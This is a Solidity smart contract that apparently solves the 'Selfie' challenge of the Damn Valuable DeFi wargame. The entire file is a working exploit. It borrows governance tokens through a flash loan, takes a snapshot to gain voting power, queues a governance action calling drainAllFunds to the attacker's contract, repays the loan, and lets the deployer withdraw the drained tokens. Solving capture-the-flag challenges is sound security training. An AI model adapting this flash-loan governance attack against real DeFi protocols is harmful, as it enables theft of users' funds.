// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import '../selfie/SimpleGovernance.sol';
import '../selfie/SelfiePool.sol';
import '../DamnValuableTokenSnapshot.sol';

contract SelfieAttacker {
	SelfiePool immutable pool;
	SimpleGovernance immutable governance;
	DamnValuableTokenSnapshot immutable DVT;

	address attacker;
	bytes public data = abi.encodeWithSignature('drainAllFunds(address)', address(this));

	constructor(
		address _pool,
		address _governance,
		address _dvt
	) {
		pool = SelfiePool(_pool);
		governance = SimpleGovernance(_governance);
		DVT = DamnValuableTokenSnapshot(_dvt);
		attacker = msg.sender;
	}

	function executeFlashLoan(uint256 borrowAmount) external {
		pool.flashLoan(borrowAmount);
	}

	function receiveTokens(address _token, uint256 _amount) external {
		// Take snapshot when we receive tokens
		DVT.snapshot();
		// Use tokens to queue a new action
		governance.queueAction(address(pool), data, 0);
		// Transfer tokens back to pool
		DVT.transfer(address(pool), _amount);
	}

	function withdrawTokens() external {
		require(msg.sender == attacker);
		DVT.transfer(msg.sender, DVT.balanceOf(address(this)));
	}
}
